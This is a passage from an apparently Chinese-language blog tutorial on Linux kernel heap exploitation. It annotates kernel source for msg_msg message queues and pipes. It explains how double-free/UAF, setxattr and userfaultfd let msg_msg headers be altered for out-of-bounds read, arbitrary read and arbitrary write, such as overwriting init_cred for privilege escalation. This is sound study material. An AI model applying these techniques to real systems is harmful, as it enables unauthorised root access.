class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//设置了MSG_COPY标志位就会准备一个msg_msg的副本copy,通常用来防止unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//从这里可以看出,同样也需要设置IPC_NOWAIT标志位才不会出错</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//这个prepare_copy()函数内部调用了load_msg()函数来创建一个新的msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//传入的size参数为bufsz,就用户空间实际需要消息的长度,那么申请的堆块长度就可变了</span></span><br><span class="line">        <span class="comment">//不一定是这条消息的长度,而是由我们直接控制,虽然最后也会释放掉</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这样就不会将msg_msg从msg_queue消息队列中进行Unlink摘除</span></span><br><span class="line">    <span class="comment">//只是释放堆块,在后续的代码中有显示</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//开始从msg_queue中寻找合适的msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//最好设置MSG_NOERROR标志位,这样请求获取消息长度小于m_ts程序也不会退出了</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//设置了MSG_COPY标志位就会将msg数据复制给copy,然后将copy赋给msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//这个copy_msg()函数就是之前提到的在汇编层面就很奇怪</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//下面是将msg_msg从和msg_queue组成的双向循环链表中unlink出来的部分</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//最后在这里进行相关堆块的释放</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-非堆块释放的数据读取"   >
          <a href="#A-非堆块释放的数据读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-非堆块释放的数据读取" class="headerlink" title="A.非堆块释放的数据读取"></a>A.非堆块释放的数据读取</h5>
      <p>一般而言，我们使用<code>msg_msg</code>进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合<code>MSG_COPY</code>这个<code>msgflg</code>标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的<code>unlink</code>触发错误。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()函数中的</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>使用这个标志位还需要在内核编译的时候设置<code>CONFIG_CHECKPOINT_RESTORE=y</code>才行，否则还是会出错的</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//正常的一些数据复制</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的<code>v5.11</code>中，<code>MSG_NOERROR</code>和<code>MSG_COPY</code>（后续会讲到）没有办法同时生效，关键点在于<code>copy_msg()</code>函数中，转化成汇编如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>注意到红框的部分，获取<code>rdi(msg)</code>和<code>rsi(copy)</code>对应的<code>m_ts</code>进行比较，而<code>copy</code>的<code>m_ts</code>是从用户传进来的想要获取消息的长度，如果小于实际的<code>msg</code>的<code>m_ts</code>长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。</p>

        <h5 id="B-释放堆块的消息读取"   >
          <a href="#B-释放堆块的消息读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-释放堆块的消息读取" class="headerlink" title="B.释放堆块的消息读取"></a>B.释放堆块的消息读取</h5>
      <p>同理如果不指定<code>MSG_COPY</code>这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的<code>mtype</code>和接收消息时设置的<code>msgtpy</code>来进行消息队列中各个位置的堆块的释放。</p>

        <h5 id="C-数据复制"   >
          <a href="#C-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-数据复制" class="headerlink" title="C.数据复制"></a>C.数据复制</h5>
      <p>不管什么标志位，只要不是<code>MSG_NOERROR</code>和<code>MSG_COPY</code>联合起来，并且申请读取消息长度<code>size</code>小于通过<code>find_msg()</code>函数获取到的实际消息的<code>m_ts</code>，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-利用"   >
          <a href="#3-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="越界读取"   >
          <a href="#越界读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#越界读取" class="headerlink" title="越界读取"></a>越界读取</h4>
      <p>这样，当我们通过之前提到的<code>double-free/UAF</code>，并且再使用<code>setxattr</code>来对<code>msg_msgmsg</code>中的<code>m_ts</code>进行修改，这样在我们调用<code>msgrcv</code>的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。</p>
<p><strong>使用<code>setxattr</code>的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样</strong></p>
<p>为了获取到地址的成功性更大，我们就需要用到单个<code>msg_queue</code>和单个<code>msg_msg</code>的内存模型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>可以看到单个<code>msg_msg</code>在<code>msg_queue</code>的管理下形成双向循环链表，所以如果我们通过<code>msgget</code>和<code>msgsnd</code>多申请一些相同大小的且只有一个<code>msg_msg</code>结构体的<code>msg_queue</code>，那么越界读取的时候，就可以读取到只有单个<code>msg_msg</code>的头部了</p>
<p>而单个<code>msg_msg</code>由于双向循环链表，其头部中又存在指向<code>msg_queue</code>的指针，那么这样就能泄露出<code>msg_queue</code>的堆地址了。</p>

        <h4 id="任意读取"   >
          <a href="#任意读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意读取" class="headerlink" title="任意读取"></a>任意读取</h4>
      <p>完成上述泄露<code>msg_queue</code>的堆地址之后，就需要用到<code>msg_msg</code>的内存布局了</p>
<p>由于我们的<code>msg_msg</code>消息的内存布局如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>相关读取源码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>所以如果我们可以修改<code>next</code>指针和<code>m_ts</code>，结合读取<code>msg</code>最终调用函数<code>store_msg</code>的源码，那么就能够实现任意读取。</p>
<p>那么接着上面的，我们得到<code>msg_queue</code>之后，可以再将<code>msg_msg</code>的next指针指回<code>msg_queue</code>，读出其中的<code>msg_msg</code>，就能获得当前可控堆块的堆地址。</p>
<p>这样完成之后，我们结合<code>userfaultfd</code>和<code>setxattr</code>频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。</p>
<p>同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。</p>

        <h4 id="任意写"   >
          <a href="#任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4>
      <p>同样的，<code>msg_msg</code>由于next指针的存在，结合<code>msgsnd</code>也具备任意地址写的功能。我们可以在拷贝的时候利用<code>userfaultfd</code>停下来，然后更改next指针，使其指向我们需要的地方，比如<code>init_cred</code>结构体位置，从而直接修改进行提权。</p>

        <h2 id="2-pipe管道—kmalloc-1024-kmalloc-192"   >
          <a href="#2-pipe管道—kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-pipe管道—kmalloc-1024-kmalloc-192" class="headerlink" title="2.pipe管道—kmalloc-1024/kmalloc-192"></a>2.pipe管道—kmalloc-1024/kmalloc-192</h2>
      <p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31条消息) Linux系统调用：pipe()系统调用源码分析_rtoax的博客-CSDN博客_linux pipe 源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>通常来讲，管道用来在父进程和子进程之间通信，因为<code>fork</code>出来的子进程会继承父进程的文件描述符副本。这里就使用当前进程来创建管道符，从管道的读取端(<code>pipe_fd[0]</code>)和写入端(<code>pipe_fd[1]</code>)来进行利用。</p>

        <h3 id="1-使用方法-1"   >
          <a href="#1-使用方法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-1" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-2"   >
          <a href="#①创建-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-2" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用pipe或者pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//默认阻塞状态</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>其中<code>pipe2</code>函数或者系统调用<code>__NR_pipe2</code>的<code>flag</code>支持除0之外的三种模式，可用在<code>man</code>手册中查看。</p>
<p>如果传入的<code>flag</code>为0，则和<code>pipe</code>函数是一样的，是阻塞的。</p>
<p>阻塞状态：即当没有数据在管道中时，如果还调用<code>read</code>从管道读取数据，那么就会使得程序处于阻塞状态，其他的也是类似的情况。</p>
<p>会默认创建两个fd文件描述符的，该fd文件描述符效果的相关结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>放入到<code>pipe_fd</code>中，如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>之后使用<code>write/read</code>来写入读取即可，注意写入端为<code>fd[1]</code>，读取端为<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-1"   >
          <a href="#②释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-1" class="headerlink" title="②释放"></a>②释放</h4>
      <p>由于<code>pipe</code>管道创建后会对应创建文件描述符，所以释放两端对应的文件描述符即可释放管道<code>pipe</code>管道</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>需要将两个文件描述符fd都给释放掉或者使用<code>read</code>将管道中所有数据都读取出来，才会进入<code>free_pipe_info</code>函数来释放在线性映射区域申请的相关内存资源，否则还是不会进入的。</p>

        <h3 id="2-内存分配与释放-1"   >
          <a href="#2-内存分配与释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-1" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①分配"   >
          <a href="#①分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配" class="headerlink" title="①分配"></a>①分配</h4>
      <p>发生在调用<code>pipe</code>/<code>pipe2</code>函数，或者系统调用<code>__NR_pipe</code>/<code>__NR_pipe2</code>时，内核入口为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() 系统调用 */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>调用之后会在内核的线性映射区域进行内存分配，也就是常见的内核堆管理的区域。分配点在如下函数中：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_info管理结构，大小为0xa0，属于kmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//相关的消息结构为pipe_buffer数组,总共16*0x28=0x280,直接从kmalloc-1024中拿取堆块</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//对申请的pipe管道进行一些初始化</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span 